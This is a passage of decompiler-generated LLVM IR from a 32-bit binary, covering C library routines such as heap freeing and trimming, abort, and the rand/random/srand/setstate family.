  store i32 %v1_805fef2, i32* @ebp, align 4
  %v1_805fef5 = load i32, i32* @global_var_807e64c.733, align 4
  %v12_805fef5 = icmp eq i32 %v1_805ff01, %v1_805fef5
  br i1 %v12_805fef5, label %dec_label_pc_805ff4f, label %dec_label_pc_805fefd

dec_label_pc_805fefd:                             ; preds = %dec_label_pc_805feee
  %v2_805fefd = add i32 %v1_805ff01, 4
  %v3_805fefd = add i32 %v2_805fefd, %v1_805fef2
  %v4_805fefd = inttoptr i32 %v3_805fefd to i32*
  %v5_805fefd = load i32, i32* %v4_805fefd, align 4
  store i32 %v5_805fefd, i32* %eax.global-to-local, align 4
  %v3_805ff01 = inttoptr i32 %v2_805fefd to i32*
  store i32 %v1_805fef2, i32* %v3_805ff01, align 4
  %v0_805ff04 = load i32, i32* %eax.global-to-local, align 4
  %v1_805ff04 = urem i32 %v0_805ff04, 2
  %v2_805ff04 = icmp eq i32 %v1_805ff04, 0
  store i32 %v1_805ff04, i32* %eax.global-to-local, align 4
  %v1_805ff09 = icmp eq i1 %v2_805ff04, false
  br i1 %v1_805ff09, label %dec_label_pc_805ff2a, label %dec_label_pc_805ff0b

dec_label_pc_805ff0b:                             ; preds = %dec_label_pc_805fefd
  %v0_805ff0b = load i32, i32* @esi, align 4
  %v1_805ff0b = add i32 %v0_805ff0b, 8
  %v2_805ff0b = inttoptr i32 %v1_805ff0b to i32*
  %v3_805ff0b = load i32, i32* %v2_805ff0b, align 4
  store i32 %v3_805ff0b, i32* @edx, align 4
  %v1_805ff0e = add i32 %v0_805ff0b, 12
  %v2_805ff0e = inttoptr i32 %v1_805ff0e to i32*
  %v3_805ff0e = load i32, i32* %v2_805ff0e, align 4
  store i32 %v3_805ff0e, i32* %eax.global-to-local, align 4
  %v1_805ff11 = add i32 %v3_805ff0b, 12
  %v2_805ff11 = inttoptr i32 %v1_805ff11 to i32*
  %v3_805ff11 = load i32, i32* %v2_805ff11, align 4
  store i32 %v3_805ff11, i32* @edi, align 4
  %v12_805ff14 = icmp eq i32 %v3_805ff11, %v0_805ff0b
  %v1_805ff16 = icmp eq i1 %v12_805ff14, false
  br i1 %v1_805ff16, label %dec_label_pc_805ff1d, label %dec_label_pc_805ff18

dec_label_pc_805ff18:                             ; preds = %dec_label_pc_805ff0b
  %v1_805ff18 = add i32 %v3_805ff0e, 8
  %v2_805ff18 = inttoptr i32 %v1_805ff18 to i32*
  %v3_805ff18 = load i32, i32* %v2_805ff18, align 4
  %v15_805ff18 = icmp eq i32 %v3_805ff18, %v3_805ff11
  br i1 %v15_805ff18, label %dec_label_pc_805ff22, label %dec_label_pc_805ff1d

dec_label_pc_805ff1d:                             ; preds = %dec_label_pc_805ff18, %dec_label_pc_805ff0b, %dec_label_pc_805fee1, %dec_label_pc_805fecd
  %v0_805ff1d = call i32 @abort()
  store i32 %v0_805ff1d, i32* %eax.global-to-local, align 4
  %v1_805ff22.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805ff22

dec_label_pc_805ff22:                             ; preds = %dec_label_pc_805ff18, %dec_label_pc_805ff1d
  %v1_805ff22 = phi i32 [ %v3_805ff0b, %dec_label_pc_805ff18 ], [ %v1_805ff22.pre, %dec_label_pc_805ff1d ]
  %v0_805ff22 = phi i32 [ %v3_805ff0e, %dec_label_pc_805ff18 ], [ %v0_805ff1d, %dec_label_pc_805ff1d ]
  %v2_805ff22 = add i32 %v1_805ff22, 12
  %v3_805ff22 = inttoptr i32 %v2_805ff22 to i32*
  store i32 %v0_805ff22, i32* %v3_805ff22, align 4
  %v0_805ff25 = load i32, i32* @edx, align 4
  %v1_805ff25 = load i32, i32* %eax.global-to-local, align 4
  %v2_805ff25 = add i32 %v1_805ff25, 8
  %v3_805ff25 = inttoptr i32 %v2_805ff25 to i32*
  store i32 %v0_805ff25, i32* %v3_805ff25, align 4
  %v0_805ff28 = load i32, i32* @ebx, align 4
  %v1_805ff28 = load i32, i32* @ebp, align 4
  %v2_805ff28 = add i32 %v1_805ff28, %v0_805ff28
  store i32 %v2_805ff28, i32* @ebx, align 4
  br label %dec_label_pc_805ff2a

dec_label_pc_805ff2a:                             ; preds = %dec_label_pc_805fefd, %dec_label_pc_805ff22
  %v0_805ff2a = load i32, i32* @global_var_807e65c.751, align 4
  store i32 %v0_805ff2a, i32* %eax.global-to-local, align 4
  %v0_805ff2f = load i32, i32* @ecx, align 4
  %v1_805ff2f = add i32 %v0_805ff2f, 12
  %v2_805ff2f = inttoptr i32 %v1_805ff2f to i32*
  store i32 ptrtoint (i32* @global_var_807e654.735 to i32), i32* %v2_805ff2f, align 4
  %v0_805ff36 = load i32, i32* %eax.global-to-local, align 4
  %v1_805ff36 = load i32, i32* @ecx, align 4
  %v2_805ff36 = add i32 %v1_805ff36, 8
  %v3_805ff36 = inttoptr i32 %v2_805ff36 to i32*
  store i32 %v0_805ff36, i32* %v3_805ff36, align 4
  %v0_805ff39 = load i32, i32* @ebx, align 4
  %v1_805ff39 = load i32, i32* @ecx, align 4
  %v3_805ff39 = add i32 %v1_805ff39, %v0_805ff39
  %v4_805ff39 = inttoptr i32 %v3_805ff39 to i32*
  store i32 %v0_805ff39, i32* %v4_805ff39, align 4
  %v0_805ff3c = load i32, i32* @ecx, align 4
  %v1_805ff3c = load i32, i32* %eax.global-to-local, align 4
  %v2_805ff3c = add i32 %v1_805ff3c, 12
  %v3_805ff3c = inttoptr i32 %v2_805ff3c to i32*
  store i32 %v0_805ff3c, i32* %v3_805ff3c, align 4
  %v0_805ff3f = load i32, i32* @ebx, align 4
  %v1_805ff41 = or i32 %v0_805ff3f, 1
  store i32 %v1_805ff41, i32* %eax.global-to-local, align 4
  %v0_805ff44 = load i32, i32* @ecx, align 4
  store i32 %v0_805ff44, i32* @global_var_807e65c.751, align 4
  %v2_805ff4a = add i32 %v0_805ff44, 4
  %v3_805ff4a = inttoptr i32 %v2_805ff4a to i32*
  store i32 %v1_805ff41, i32* %v3_805ff4a, align 4
  br label %dec_label_pc_805ff5f

dec_label_pc_805ff4f:                             ; preds = %dec_label_pc_805feee
  %v0_805ff4f = load i32, i32* @ebx, align 4
  %v2_805ff4f = add i32 %v0_805ff4f, %v1_805fef2
  store i32 %v2_805ff4f, i32* @ebx, align 4
  %v1_805ff53 = or i32 %v2_805ff4f, 1
  store i32 %v1_805ff53, i32* %eax.global-to-local, align 4
  %v1_805ff56 = load i32, i32* @ecx, align 4
  %v2_805ff56 = add i32 %v1_805ff56, 4
  %v3_805ff56 = inttoptr i32 %v2_805ff56 to i32*
  store i32 %v1_805ff53, i32* %v3_805ff56, align 4
  %v0_805ff59 = load i32, i32* @ecx, align 4
  store i32 %v0_805ff59, i32* @global_var_807e64c.733, align 4
  br label %dec_label_pc_805ff5f

dec_label_pc_805ff5f:                             ; preds = %dec_label_pc_805ff2a, %dec_label_pc_805ff4f
  %v0_805ff5f = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_805ff5f, 131072
  br i1 %tmp21, label %dec_label_pc_805ffc4, label %dec_label_pc_805ff67

dec_label_pc_805ff67:                             ; preds = %dec_label_pc_805ff5f
  %v0_805ff67 = load i8, i8* @global_var_807e620.732, align 32
  %v1_805ff67 = and i8 %v0_805ff67, 2
  %v2_805ff67 = icmp eq i8 %v1_805ff67, 0
  br i1 %v2_805ff67, label %dec_label_pc_805ff80, label %dec_label_pc_805ff70

dec_label_pc_805ff70:                             ; preds = %dec_label_pc_805ff67
  %v2_805ff78 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807e620.732 to i32*))
  store i32 %v2_805ff78, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ff80

dec_label_pc_805ff80:                             ; preds = %dec_label_pc_805ff67, %dec_label_pc_805ff70
  %v0_805ff80 = load i32, i32* @global_var_807e64c.733, align 4
  store i32 %v0_805ff80, i32* %eax.global-to-local, align 4
  %v1_805ff85 = add i32 %v0_805ff80, 4
  %v2_805ff85 = inttoptr i32 %v1_805ff85 to i32*
  %v3_805ff85 = load i32, i32* %v2_805ff85, align 4
  %v1_805ff88 = and i32 %v3_805ff85, -4
  store i32 %v1_805ff88, i32* %eax.global-to-local, align 4
  %v1_805ff8b = load i32, i32* @global_var_807e964.749, align 4
  %v7_805ff8b = icmp ult i32 %v1_805ff88, %v1_805ff8b
  br i1 %v7_805ff8b, label %dec_label_pc_805ffc4, label %dec_label_pc_805ff93

dec_label_pc_805ff93:                             ; preds = %dec_label_pc_805ff80
  store i32 ptrtoint (i8* @global_var_807e620.732 to i32), i32* @edx, align 4
  %v0_805ff98 = load i32, i32* @global_var_807e968.747, align 8
  store i32 %v0_805ff98, i32* @eax, align 4
  %v0_805ff9d = call i32 @__malloc_trim()
  store i32 %v0_805ff9d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ffc4

dec_label_pc_805ffa4:                             ; preds = %dec_label_pc_805feac
  %v2_805ffa4 = inttoptr i32 %v1_805fe75 to i32*
  %v3_805ffa4 = load i32, i32* %v2_805ffa4, align 4
  store i32 %v3_805ffa4, i32* %edx.global-to-local, align 4
  %v0_805ffa7 = load i32, i32* @global_var_807e970.740, align 16
  %v1_805ffa7 = add i32 %v0_805ffa7, -1
  store i32 %v1_805ffa7, i32* @global_var_807e970.740, align 16
  %v2_805ffad = add i32 %v3_805ffa4, %v1_805fe85
  store i32 %v2_805ffad, i32* %eax.global-to-local, align 4
  %v2_805ffb0 = sub i32 %v1_805fe75, %v3_805ffa4
  %v0_805ffb6 = load i32, i32* @global_var_807e984.743, align 4
  %v2_805ffb6 = sub i32 %v0_805ffb6, %v2_805ffad
  store i32 %v2_805ffb6, i32* @global_var_807e984.743, align 4
  %v4_805ffbc = call i32 @munmap(i32 %v2_805ffb0, i32 %v2_805ffad, i32 %v1_805fe85, i32 %v1_805fe85)
  store i32 %v4_805ffbc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ffc4

dec_label_pc_805ffc4:                             ; preds = %dec_label_pc_805ff80, %dec_label_pc_805ff5f, %dec_label_pc_805ff93, %dec_label_pc_805fe8c, %dec_label_pc_805ffa4
  store i32 %v2_805fe5f, i32* %eax.global-to-local, align 4
  %v3_805ffcd = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_805ffcd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ffd5

dec_label_pc_805ffd5:                             ; preds = %entry, %dec_label_pc_805ffc4
  %.0 = phi i32 [ undef, %entry ], [ %v3_805ffcd, %dec_label_pc_805ffc4 ]
  store i32 %v0_805fe44, i32* @ebx, align 4
  store i32 %v0_805fe43, i32* @esi, align 4
  store i32 %v0_805fe42, i32* @edi, align 4
  store i32 %v0_805fe41, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_805ffa4, { 1, 0, 2 }
  uselistorder i32 %v0_805ff39, { 1, 0 }
  uselistorder i32 %v1_805ff04, { 1, 0 }
  uselistorder i32 %v2_805fefd, { 1, 0 }
  uselistorder i32 %v1_805fef2, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805ff01, { 1, 0 }
  uselistorder i32 %v2_805fe8c, { 1, 0 }
  uselistorder i32 %v1_805fe85, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_805fe80, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805fe75, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 21, 22, 23, 24, 25, 26, 19, 20 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* bitcast (i8* @global_var_807e620.732 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_807e654.735 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_805ffd5, { 1, 0 }
  uselistorder label %dec_label_pc_805ffc4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805ff80, { 1, 0 }
  uselistorder label %dec_label_pc_805ff5f, { 1, 0 }
  uselistorder label %dec_label_pc_805ff2a, { 1, 0 }
  uselistorder label %dec_label_pc_805ff22, { 1, 0 }
  uselistorder label %dec_label_pc_805feee, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805ffdd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805ffea = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_807e620.732 to i8) to i32) to i32*))
  %v0_805ffef = load i32, i32* @ebx, align 4
  store i32 %v0_805ffef, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_807e620.732 to i32), i32* @edx, align 4
  store i32 %v0_805ffdd, i32* @ebx, align 4
  %v0_805fffa = call i32 @__malloc_trim()
  ret i32 %v0_805fffa

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_807e620.732 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 3, 1, 2, 4 }
  uselistorder i8* @global_var_807e620.732, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_806000c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074768.752 to i32))
  %v12_8060016 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806001b

dec_label_pc_806001b:                             ; preds = %dec_label_pc_806001b.dec_label_pc_806001b_crit_edge, %entry
  %v0_806001b = phi i32 [ %v12_8060016, %entry ], [ %v0_806001b.pre, %dec_label_pc_806001b.dec_label_pc_806001b_crit_edge ]
  %v1_806002619 = phi i32 [ 31, %entry ], [ %v1_8060026, %dec_label_pc_806001b.dec_label_pc_806001b_crit_edge ]
  %v2_806001b = mul i32 %v1_806002619, 4
  %v3_806001b = add i32 %v2_806001b, 152
  %v4_806001b = add i32 %v3_806001b, %v0_806001b
  %v5_806001b = inttoptr i32 %v4_806001b to i32*
  store i32 0, i32* %v5_806001b, align 4
  %v0_8060026.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8060026 = add i32 %v0_8060026.pre, -1
  %v9_8060026 = icmp slt i32 %v1_8060026, 0
  store i32 %v1_8060026, i32* %eax.global-to-local, align 4
  %v1_8060027 = icmp eq i1 %v9_8060026, false
  br i1 %v1_8060027, label %dec_label_pc_806001b.dec_label_pc_806001b_crit_edge, label %dec_label_pc_8060029

dec_label_pc_806001b.dec_label_pc_806001b_crit_edge: ; preds = %dec_label_pc_806001b
  %v0_806001b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806001b

dec_label_pc_8060029:                             ; preds = %dec_label_pc_806001b
  %v0_8060029 = load i32, i32* @ebx, align 4
  %v2_806002d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_806002d, i32* @ebx, align 4
  %v4_8060035 = call i32 @__sigaddset(i32 %v2_806002d, i32 6, i32 %v0_8060029, i32 %v0_8060029)
  store i32 %v4_8060035, i32* %eax.global-to-local, align 4
  %v1_806003d = icmp eq i32 %v4_8060035, 0
  %v1_806003f = icmp eq i1 %v1_806003d, false
  br i1 %v1_806003f, label %dec_label_pc_806004f, label %dec_label_pc_8060041

dec_label_pc_8060041:                             ; preds = %dec_label_pc_8060029
  %v3_8060047 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8060047 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8060047, i32 0)
  store i32 %v4_8060047, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806004f

dec_label_pc_806004f:                             ; preds = %dec_label_pc_8060029, %dec_label_pc_8060041
  %v2_80600874 = phi i32 [ %v4_8060035, %dec_label_pc_8060029 ], [ %v4_8060047, %dec_label_pc_8060041 ]
  %v0_806004f = load i8, i8* @global_var_807d120.753, align 32
  %v1_806004f = icmp eq i8 %v0_806004f, 0
  %v1_8060056 = icmp eq i1 %v1_806004f, false
  br i1 %v1_8060056, label %dec_label_pc_8060087, label %dec_label_pc_8060058

dec_label_pc_8060058:                             ; preds = %dec_label_pc_806004f
  store i8 1, i8* @global_var_807d120.753, align 32
  br label %dec_label_pc_806005f

dec_label_pc_806005f:                             ; preds = %dec_label_pc_80600c6, %dec_label_pc_8060058
  %v1_8060067 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8074768.752 to i32))
  store i32 %v1_8060067, i32* %eax.global-to-local, align 4
  %v1_8060073 = call i32 @__GI_raise(i32 6)
  store i32 %v1_8060073, i32* %eax.global-to-local, align 4
  %v1_806007f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074768.752 to i32))
  store i32 %v1_806007f, i32* %eax.global-to-local, align 4
  %v0_8060087.pre = load i8, i8* @global_var_807d120.753, align 32
  br label %dec_label_pc_8060087

dec_label_pc_8060087:                             ; preds = %dec_label_pc_806004f, %dec_label_pc_806005f
  %v2_8060087 = phi i32 [ %v2_80600874, %dec_label_pc_806004f ], [ %v1_806007f, %dec_label_pc_806005f ]
  %v0_8060087 = phi i8 [ %v0_806004f, %dec_label_pc_806004f ], [ %v0_8060087.pre, %dec_label_pc_806005f ]
  %v1_8060087 = zext i8 %v0_8060087 to i32
  %v3_8060087 = and i32 %v2_8060087, -256
  %v4_8060087 = or i32 %v1_8060087, %v3_8060087
  store i32 %v4_8060087, i32* %eax.global-to-local, align 4
  %v10_806008c = icmp eq i8 %v0_8060087, 1
  %v1_806008e = icmp eq i1 %v10_806008c, false
  br i1 %v1_806008e, label %dec_label_pc_80600e8, label %dec_label_pc_8060090

dec_label_pc_8060090:                             ; preds = %dec_label_pc_8060087
  store i8 2, i8* @global_var_807d120.753, align 32
  %v2_806009f = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_806009f, i32* %eax.global-to-local, align 4
  %v3_80600a4 = bitcast i32* %stack_var_-272 to i8*
  %v4_80600a4 = call i32 @__GI_memset(i8* %v3_80600a4, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80600bb

dec_label_pc_80600bb:                             ; preds = %dec_label_pc_80600bb.dec_label_pc_80600bb_crit_edge, %dec_label_pc_8060090
  %v0_80600bb = phi i32 [ %v12_8060016, %dec_label_pc_8060090 ], [ %v0_80600bb.pre, %dec_label_pc_80600bb.dec_label_pc_80600bb_crit_edge ]
  %v1_80600c318 = phi i32 [ 31, %dec_label_pc_8060090 ], [ %v1_80600c3, %dec_label_pc_80600bb.dec_label_pc_80600bb_crit_edge ]
  %v2_80600bb = mul i32 %v1_80600c318, 4
  %v3_80600bb = add i32 %v2_80600bb, 16
  %v4_80600bb = add i32 %v3_80600bb, %v0_80600bb
  %v5_80600bb = inttoptr i32 %v4_80600bb to i32*
  store i32 -1, i32* %v5_80600bb, align 4
  %v0_80600c3.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80600c3 = add i32 %v0_80600c3.pre, -1
  %v9_80600c3 = icmp slt i32 %v1_80600c3, 0
  store i32 %v1_80600c3, i32* %eax.global-to-local, align 4
  %v1_80600c4 = icmp eq i1 %v9_80600c3, false
  br i1 %v1_80600c4, label %dec_label_pc_80600bb.dec_label_pc_80600bb_crit_edge, label %dec_label_pc_80600c6

dec_label_pc_80600bb.dec_label_pc_80600bb_crit_edge: ; preds = %dec_label_pc_80600bb
  %v0_80600bb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80600bb

dec_label_pc_80600c6:                             ; preds = %dec_label_pc_80600bb
  store i32 %v2_806009f, i32* %eax.global-to-local, align 4
  %v4_80600db = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_80600db, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806005f

dec_label_pc_80600e8:                             ; preds = %dec_label_pc_8060087
  %v10_80600e8 = icmp eq i8 %v0_8060087, 2
  %v1_80600ea = icmp eq i1 %v10_80600e8, false
  br i1 %v1_80600ea, label %dec_label_pc_80600f4, label %dec_label_pc_80600ec

dec_label_pc_80600ec:                             ; preds = %dec_label_pc_80600e8
  store i8 3, i8* @global_var_807d120.753, align 32
  br label %dec_label_pc_80600f4

dec_label_pc_80600f4:                             ; preds = %dec_label_pc_80600e8, %dec_label_pc_80600ec
  %v0_80600f4 = phi i8 [ %v0_8060087, %dec_label_pc_80600e8 ], [ 3, %dec_label_pc_80600ec ]
  %v9_80600f4 = icmp eq i8 %v0_80600f4, 3
  %v1_80600fb = icmp eq i1 %v9_80600f4, false
  br i1 %v1_80600fb, label %dec_label_pc_806010e, label %dec_label_pc_80600fd

dec_label_pc_80600fd:                             ; preds = %dec_label_pc_80600f4
  store i8 4, i8* @global_var_807d120.753, align 32
  %v1_8060109 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_806010e:                             ; preds = %dec_label_pc_80600f4, %dec_label_pc_806010e
  br label %dec_label_pc_806010e

; uselistorder directives
  uselistorder i32 %v1_80600c3, { 2, 1, 0 }
  uselistorder i8 %v0_8060087, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8060026, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 13, 14, 9, 10, 12, 11, 1 }
  uselistorder i8 3, { 0, 2, 4, 3, 1 }
  uselistorder i32 (i32)* @pthread_mutex_unlock, { 0, 12, 11, 10, 9, 13, 3, 2, 6, 1, 8, 7, 5, 4 }
  uselistorder i8* @global_var_807d120.753, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_806010e, { 1, 0 }
  uselistorder label %dec_label_pc_80600f4, { 1, 0 }
  uselistorder label %dec_label_pc_8060087, { 1, 0 }
  uselistorder label %dec_label_pc_806004f, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8060114 = call i32 @random()
  ret i32 %v0_8060114

; uselistorder directives
  uselistorder i32 ()* @random, { 36, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 23, 22, 21, 20, 19, 18, 29, 28, 27, 26, 25, 24, 5, 4, 3, 2, 1, 0, 35, 34, 33, 6, 32, 31, 30 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_806011c = load i32, i32* @ebx, align 4
  store i32 %v0_806011c, i32* %stack_var_-4, align 4
  %v2_806012a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_806012a, i32* @ebx, align 4
  %v4_806012f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134585853, i32 ptrtoint (i32* @global_var_8074780.754 to i32))
  %v1_806013b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074780.754 to i32))
  store i32 ptrtoint (i32* @global_var_8074780.754 to i32), i32* @ecx, align 4
  %v2_8060142 = ptrtoint i32* %stack_var_-8 to i32
  %v3_806014c = call i32 @__GI_random_r(i32* nonnull @global_var_8074798, i32 %v2_8060142)
  %v3_8060156 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v3_806015b = load i32, i32* %stack_var_-8, align 4
  %v2_8060162 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8060162, i32* @ebx, align 4
  ret i32 %v3_806015b
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_806017a = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134585853, i32 ptrtoint (i32* @global_var_8074780.754 to i32))
  %v1_8060186 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074780.754 to i32))
  %v0_8060192 = load i32, i32* bitcast (i32** @global_var_80747a0.757 to i32*), align 32
  store i32 %v0_8060192, i32* @ebx, align 4
  %v3_806019c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8074798)
  %v2_80601a4 = icmp slt i32 %v3_806019c, 0
  br i1 %v2_80601a4, label %dec_label_pc_80601ab, label %dec_label_pc_80601a8

dec_label_pc_80601a8:                             ; preds = %entry
  br label %dec_label_pc_80601ab

dec_label_pc_80601ab:                             ; preds = %entry, %dec_label_pc_80601a8
  %v3_80601b4 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_80601b9 = load i32, i32* @esi, align 4
  ret i32 %v0_80601b9

; uselistorder directives
  uselistorder label %dec_label_pc_80601ab, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_80601d0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80601d0, i32* @ebx, align 4
  %v4_80601d5 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134585853, i32 ptrtoint (i32* @global_var_8074780.754 to i32))
  %v1_80601e1 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074780.754 to i32))
  %v0_80601eb = load i32, i32* bitcast (i32** @global_var_80747a0.757 to i32*), align 32
  store i32 %v0_80601eb, i32* @esi, align 4
  %v4_80601fd = inttoptr i32 %arg2 to i32*
  %v5_80601fd = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_80601fd, i32 %arg3, i32 ptrtoint (i32* @global_var_8074798 to i32))
  %v3_8060208 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 ptrtoint (i32** @global_var_807479c.758 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8060218 = load i32, i32* @ebx, align 4
  store i32 %v0_8060218, i32* %stack_var_-4, align 4
  %v2_8060226 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8060226, i32* @ebx, align 4
  %v4_806022b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134585853, i32 ptrtoint (i32* @global_var_8074780.754 to i32))
  %v1_8060237 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074780.754 to i32))
  %v2_8060247 = sext i32 %arg1 to i64
  %v3_8060247 = call i32 @srandom_r(i64 %v2_8060247, i32 ptrtoint (i32* @global_var_8074798 to i32))
  store i32 %arg1, i32* @ecx, align 4
  %v3_8060251 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v2_8060259 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8060259, i32* @ebx, align 4
  ret i32 %v3_8060251

; uselistorder directives
  uselistorder i32* @global_var_8074798, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8074798 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8074780.754 to i32), { 5, 1, 6, 2, 7, 3, 0, 8, 4 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_806025f = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_806026b = add i32 %arg1, 4
  store i32 %v1_806026b, i32* %esi.global-to-local, align 4
  %v1_806026e = add i32 %tmp4, 12
  %v2_806026e = inttoptr i32 %v1_806026e to i32*
  %v3_806026e = load i32, i32* %v2_806026e, align 4
  store i32 %v3_806026e, i32* @ecx, align 4
  %v1_8060271 = add i32 %tmp4, 8
  %v2_8060271 = inttoptr i32 %v1_8060271 to i32*
  %v3_8060271 = load i32, i32* %v2_8060271, align 4
  %v1_8060274 = icmp eq i32 %v3_806026e, 0
  %v1_8060276 = icmp eq i1 %v1_8060274, false
  br i1 %v1_8060276, label %dec_label_pc_8060281, label %dec_label_pc_8060278

dec_label_pc_8060278:                             ; preds = %entry
  %v1_8060278 = add i32 %v3_8060271, -4
  %v2_8060278 = inttoptr i32 %v1_8060278 to i32*
  store i32 0, i32* %v2_8060278, align 4
  br label %dec_label_pc_8060291

dec_label_pc_8060281:                             ; preds = %entry
  %v1_8060281 = add i32 %tmp4, 4
  %v2_8060281 = inttoptr i32 %v1_8060281 to i32*
  %v3_8060281 = load i32, i32* %v2_8060281, align 4
  %v2_8060284 = sub i32 %v3_8060281, %v3_8060271
  %v2_8060286 = sdiv i32 %v2_8060284, 4
  %v3_8060289 = mul i32 %v2_8060286, 5
  %v2_806028c = add i32 %v3_8060289, %v3_806026e
  store i32 %v2_806028c, i32* %eax.global-to-local, align 4
  %v2_806028e = add i32 %v3_8060271, -4
  %v3_806028e = inttoptr i32 %v2_806028e to i32*
  store i32 %v2_806028c, i32* %v3_806028e, align 4
  br label %dec_label_pc_8060291

